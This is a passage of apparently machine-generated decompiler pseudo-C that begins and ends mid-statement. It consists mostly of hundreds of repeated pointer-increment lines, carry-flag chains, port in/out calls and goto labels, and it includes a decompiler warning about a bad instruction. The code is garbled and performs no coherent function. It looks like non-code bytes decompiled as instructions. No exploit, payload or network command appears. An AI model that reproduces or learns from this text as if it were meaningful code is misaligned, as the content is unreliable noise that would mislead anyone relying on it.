uVar53;\n                    *puVar14 = *puVar14 + uVar53;\n                    *puVar14 = *puVar14 + uVar53;\n                    *puVar14 = *puVar14 + uVar53;\n                    *puVar14 = *puVar14 + uVar53;\n                    *puVar14 = *puVar14 + uVar53;\n                }\n                else if (!SCARRY4(puVar26, 1)) {\n                    puVar23 = puVar14 + 2;\n                    *0xffff0044 = puVar23;\n                    *pcVar44 = *pcVar44 + *0xffff0044;\n                    *puVar23 = *puVar23 + *0xffff0044;\n                    puVar14[-0x67ffbb5c] = puVar14[-0x67ffbb5c] + (puVar26 + 1 >> 8);\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                uVar10 = *puVar14;\n                *puVar14 = *puVar14 + uVar53;\n                bVar54 = CARRY1(*puVar14, uVar24) || CARRY1(*puVar14 + uVar24, CARRY1(uVar10, uVar53));\n                *puVar14 = *puVar14 + uVar24 + CARRY1(uVar10, uVar53);\n                bVar55 = CARRY1(*puVar14, uVar24) || CARRY1(*puVar14 + uVar24, bVar54);\n                *puVar14 = *puVar14 + uVar24 + bVar54;\n                bVar54 = CARRY1(*puVar14, uVar24) || CARRY1(*puVar14 + uVar24, bVar55);\n                *puVar14 = *puVar14 + uVar24 + bVar55;\n                bVar55 = CARRY1(*puVar14, uVar24) || CARRY1(*puVar14 + uVar24, bVar54);\n                *puVar14 = *puVar14 + uVar24 + bVar54;\n                bVar54 = CARRY1(*puVar14, uVar24) || CARRY1(*puVar14 + uVar24, bVar55);\n                *puVar14 = *puVar14 + uVar24 + bVar55;\n                bVar55 = CARRY1(*puVar14, uVar24) || CARRY1(*puVar14 + uVar24, bVar54);\n                *puVar14 = *puVar14 + uVar24 + bVar54;\n                bVar54 = CARRY1(*puVar14, uVar24) || CARRY1(*puVar14 + uVar24, bVar55);\n                *puVar14 = *puVar14 + uVar24 + bVar55;\n                bVar55 = CARRY1(*puVar14, uVar24) || CARRY1(*puVar14 + uVar24, bVar54);\n                *puVar14 = *puVar14 + uVar24 + bVar54;\n                bVar54 = CARRY1(*puVar14, uVar24) || CARRY1(*puVar14 + uVar24, bVar55);\n                *puVar14 = *puVar14 + uVar24 + bVar55;\n                bVar55 = CARRY1(*puVar14, uVar24) || CARRY1(*puVar14 + uVar24, bVar54);\n                *puVar14 = *puVar14 + uVar24 + bVar54;\n                bVar54 = CARRY1(*puVar14, uVar24) || CARRY1(*puVar14 + uVar24, bVar55);\n                *puVar14 = *puVar14 + uVar24 + bVar55;\n                uVar9 = *puVar14;\n                uVar10 = *puVar14;\n                *puVar14 = uVar10 + uVar24 + bVar54;\n                *puVar14 = *puVar14 + uVar24 + (CARRY1(uVar9, uVar24) || CARRY1(uVar10 + uVar24, bVar54));\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                uVar10 = uVar25 >> 8;\n                *puVar14 = *puVar14 & uVar10;\n                *puVar14 = *puVar14 & uVar10;\n                *puVar14 = *puVar14 & uVar10;\n                *puVar14 = *puVar14 & uVar10;\n                *puVar14 = *puVar14 & uVar10;\n                *puVar14 = *puVar14 & uVar10;\n                *puVar14 = *puVar14 & uVar10;\n                *puVar14 = *puVar14 & uVar10;\n                *puVar14 = *puVar14 & uVar10;\n                *puVar14 = *puVar14 & uVar10;\n                *puVar14 = *puVar14 & uVar10;\n                *puVar14 = *puVar14 & uVar10;\n                *puVar14 = *puVar14 & uVar10;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                *puVar14 = *puVar14 + uVar53;\n                uVar10 = *puVar14;\n                uVar53 = *puVar14;\n                puVar58 = *in_stack_ffffffc8;\n                puVar49 = in_stack_ffffffc8[1];\n                iVar46 = in_stack_ffffffc8[2];\n                uVar12 = in_stack_ffffffc8[4];\n                ppcVar17 = in_stack_ffffffc8[5];\n                pcVar44 = in_stack_ffffffc8[6];\n                puVar14 = in_stack_ffffffc8[7];\n                uVar25 = in_stack_ffffffc8 + 0x1e;\n                puVar36 = in_stack_ffffffc8 + 8 & 0xffff0000 | uVar25;\n                puVar16 = segment(in_SS, uVar25);\n                *puVar16 = 0x6a69;\n                iVar3 = *(iVar46 * 3 + 0x6e) * 0x6f;\n                iVar46 = iVar3;\n                bVar54 = iVar46 != iVar3;\n                if (bVar54) {\ncode_r0x0046cba0:\n                    *puVar14 = *puVar14 + puVar14;\n                    *puVar14 = *puVar14 + puVar14;\ncode_r0x0046cba4:\n                    *puVar14 = *puVar14 + puVar14;\n                    *puVar14 = *puVar14 + puVar14;\ncode_r0x0046cba8:\n                    *puVar14 = *puVar14 + puVar14;\n                    *puVar14 = *puVar14 + puVar14;\ncode_r0x0046cbac:\n                    *puVar14 = *puVar14 + puVar14;\n                    *puVar14 = *puVar14 + puVar14;\n                }\n                else {\n                    if (bVar54) goto code_r0x0046cba4;\n                    if (uVar53 == 0) goto code_r0x0046cba8;\n                    if (bVar54 || uVar53 == 0) goto code_r0x0046cbac;\n                    if (-1 < uVar10) {\n                        cVar8 = puVar14;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        pcVar44[0x42] = pcVar44[0x42] + cVar8;\n                        *(puVar36 + -4) = puVar14 + -1;\n                        *(puVar36 + -8) = pcVar44 + -1;\n                        *(puVar36 + -0xc) = ppcVar17 + -1;\n                        *(puVar36 + -0x10) = uVar12;\n                        *(puVar36 + -0x14) = puVar36 + -0x10;\n                        *(puVar36 + -0x18) = iVar46;\n                        *(puVar36 + -0x1c) = puVar49;\n                        *(puVar36 + -0x20) = puVar58;\n                        puVar14 = *(puVar36 + -0x20);\n                        pcVar44 = *(puVar36 + -0x1c);\n                        ppcVar17 = *(puVar36 + -0x18);\n                        puVar36 = puVar36 + -0x14;\n                        cVar8 = puVar14;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        goto code_r0x0046cba0;\n                    }\n                }\n                uVar9 = puVar14;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                uVar53 = *puVar14;\n                *puVar14 = *puVar14 + uVar9;\n                uVar24 = ppcVar17;\n                bVar54 = CARRY1(*puVar14, uVar24) || CARRY1(*puVar14 + uVar24, CARRY1(uVar53, uVar9));\n                *puVar14 = *puVar14 + uVar24 + CARRY1(uVar53, uVar9);\n                bVar55 = CARRY1(*puVar14, uVar24) || CARRY1(*puVar14 + uVar24, bVar54);\n                *puVar14 = *puVar14 + uVar24 + bVar54;\n                bVar54 = CARRY1(*puVar14, uVar24) || CARRY1(*puVar14 + uVar24, bVar55);\n                *puVar14 = *puVar14 + uVar24 + bVar55;\n                bVar55 = CARRY1(*puVar14, uVar24) || CARRY1(*puVar14 + uVar24, bVar54);\n                *puVar14 = *puVar14 + uVar24 + bVar54;\n                bVar54 = CARRY1(*puVar14, uVar24) || CARRY1(*puVar14 + uVar24, bVar55);\n                *puVar14 = *puVar14 + uVar24 + bVar55;\n                bVar55 = CARRY1(*puVar14, uVar24) || CARRY1(*puVar14 + uVar24, bVar54);\n                *puVar14 = *puVar14 + uVar24 + bVar54;\n                bVar54 = CARRY1(*puVar14, uVar24) || CARRY1(*puVar14 + uVar24, bVar55);\n                *puVar14 = *puVar14 + uVar24 + bVar55;\n                bVar55 = CARRY1(*puVar14, uVar24) || CARRY1(*puVar14 + uVar24, bVar54);\n                *puVar14 = *puVar14 + uVar24 + bVar54;\n                bVar54 = CARRY1(*puVar14, uVar24) || CARRY1(*puVar14 + uVar24, bVar55);\n                *puVar14 = *puVar14 + uVar24 + bVar55;\n                bVar55 = CARRY1(*puVar14, uVar24) || CARRY1(*puVar14 + uVar24, bVar54);\n                *puVar14 = *puVar14 + uVar24 + bVar54;\n                bVar54 = CARRY1(*puVar14, uVar24) || CARRY1(*puVar14 + uVar24, bVar55);\n                *puVar14 = *puVar14 + uVar24 + bVar55;\n                uVar53 = *puVar14;\n                uVar10 = *puVar14;\n                *puVar14 = uVar10 + uVar24 + bVar54;\n                *puVar14 = *puVar14 + uVar24 + (CARRY1(uVar53, uVar24) || CARRY1(uVar10 + uVar24, bVar54));\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                uVar24 = puVar14 >> 8;\n                *puVar14 = *puVar14 & uVar24;\n                *puVar14 = *puVar14 & uVar24;\n                *puVar14 = *puVar14 & uVar24;\n                *puVar14 = *puVar14 & uVar24;\n                *puVar14 = *puVar14 & uVar24;\n                *puVar14 = *puVar14 & uVar24;\n                *puVar14 = *puVar14 & uVar24;\n                *puVar14 = *puVar14 & uVar24;\n                *puVar14 = *puVar14 & uVar24;\n                *puVar14 = *puVar14 & uVar24;\n                *puVar14 = *puVar14 & uVar24;\n                *puVar14 = *puVar14 & uVar24;\n                *puVar14 = *puVar14 & uVar24;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                *puVar14 = *puVar14 + uVar9;\n                puVar23 = pcVar44 + 0x62;\n                bVar54 = CARRY1(*puVar23, uVar24);\n                uVar53 = *puVar23;\n                *puVar23 = *puVar23 + uVar24;\n                uVar10 = *puVar23;\n                puVar15 = iVar46 + 0x66;\n                iVar2 = (puVar36 & 3) - (*puVar15 & 3);\n                *puVar15 = *puVar15 + bVar54 * iVar2;\n                uVar25 = puVar36 - 4;\n                puVar37 = puVar36 & 0xffff0000 | uVar25;\n                puVar47 = segment(in_SS, uVar25);\n                *puVar47 = 0x6c6b6a69;\n                puVar47 = puVar58 + 1;\n                uVar29 = SUB42(ppcVar17, 0);\n                uVar31 = in(uVar29);\n                *puVar58 = uVar31;\n                out(*puVar49, uVar29);\n                out(*(puVar49 + 1), uVar29);\n                if (SCARRY1(uVar53, uVar24)) {\ncode_r0x0046cdab:\n                    *puVar14 = *puVar14 + puVar14;\n                    *puVar14 = *puVar14 + puVar14;\ncode_r0x0046cdaf:\n                    *puVar14 = *puVar14 + puVar14;\n                    *puVar14 = *puVar14 + puVar14;\ncode_r0x0046cdb3:\n                    *puVar14 = *puVar14 + puVar14;\n                    *puVar14 = *puVar14 + puVar14;\n                }\n                else {\n                    if (bVar54) goto code_r0x0046cdaf;\n                    if (0 < iVar2) goto code_r0x0046cdb3;\n                    if (!bVar54 && 0 >= iVar2) {\n                        puVar50 = puVar49 + 5;\n                        if (uVar10 < '\\0') goto code_r0x0046cdbb;\n                        *puVar14 = *puVar14 + uVar9;\n                        *puVar14 = *puVar14 + uVar9;\n                        pcVar44[0x42] = pcVar44[0x42] + uVar9;\n                        *(puVar37 + -4) = puVar14 + -1;\n                        *(puVar37 + -8) = pcVar44 + -1;\n                        *(puVar37 + -0xc) = ppcVar17 + -1;\n                        *(puVar37 + -0x10) = uVar12;\n                        *(puVar37 + -0x14) = puVar37 + -0x10;\n                        *(puVar37 + -0x18) = iVar46;\n                        *(puVar37 + -0x1c) = puVar49 + 5;\n                        *(puVar37 + -0x20) = puVar58 + 1;\n                        puVar14 = *(puVar37 + -0x20);\n                        pcVar44 = *(puVar37 + -0x1c);\n                        ppcVar17 = *(puVar37 + -0x18);\n                        puVar37 = puVar37 + -0x14;\n                        cVar8 = puVar14;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        *puVar14 = *puVar14 + cVar8;\n                        goto code_r0x0046cdab;\n                    }\n                }\n                puVar47 = puVar58 + 1;\n                *puVar14 = *puVar14 + puVar14;\n                *puVar14 = *puVar14 + puVar14;\n                puVar50 = puVar49 + 5;\ncode_r0x0046cdbb:\n                while( true ) {\n                    cVar8 = puVar14;\n                    *puVar14 = *puVar14 + cVar8;\n                    *puVar14 = *puVar14 + cVar8;\n                    *puVar14 = *puVar14 + cVar8;\n                    *puVar14 = *puVar14 + cVar8;\n                    *puVar14 = *puVar14 + cVar8;\n                    *puVar14 = *puVar14 + cVar8;\n                    *puVar14 = *puVar14 + cVar8;\n                    *puVar14 = *puVar14 + cVar8;\n                    *puVar14 = *puVar14 + cVar8;\n                    *puVar14 = *puVar14 + cVar8;\n                    *puVar14 = *puVar14 + cVar8;\n                    *puVar14 = *puVar14 + cVar8;\n                    *puVar14 = *puVar14 + cVar8;\n                    *puVar14 = *puVar14 + cVar8;\n                    *puVar14 = *puVar14 + cVar8;\n                    *puVar14 = *puVar14 + cVar8;\n                    *puVar14 = *puVar14 + cVar8;\n                    *puVar14 = *puVar14 + cVar8;\n                    *puVar14 = *puVar14 + cVar8;\n                    *puVar14 = *puVar14 + cVar8;\n                    *puVar14 = *puVar14 + cVar8;\n                    *puVar14 = *puVar14 + cVar8;\n                    uVar53 = cVar8 * '\\x02';\n                    puVar58 = puVar47 + 1;\n                    uVar12 = in(ppcVar17);\n                    *puVar47 = uVar12;\n                    *pcVar44 = *pcVar44 + uVar53;\n                    piVar13 = puVar14 & 0xffffff00 | uVar53 + pcVar44[puVar14 & 0xffffff00 | uVar53];\n                    puVar47 = puVar47 + 5;\n                    *puVar58 = *puVar50;\n                    puVar26 = piVar13 + *piVar13;\n                    pcVar21 = puVar26 + -0x7e;\n                    cVar7 = puVar26 >> 8;\n                    *pcVar21 = *pcVar21 + cVar7;\n                    cVar8 = puVar26;\n                    if (*pcVar21 < '\\0') break;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 = *puVar26 + cVar8;\n                    *puVar26 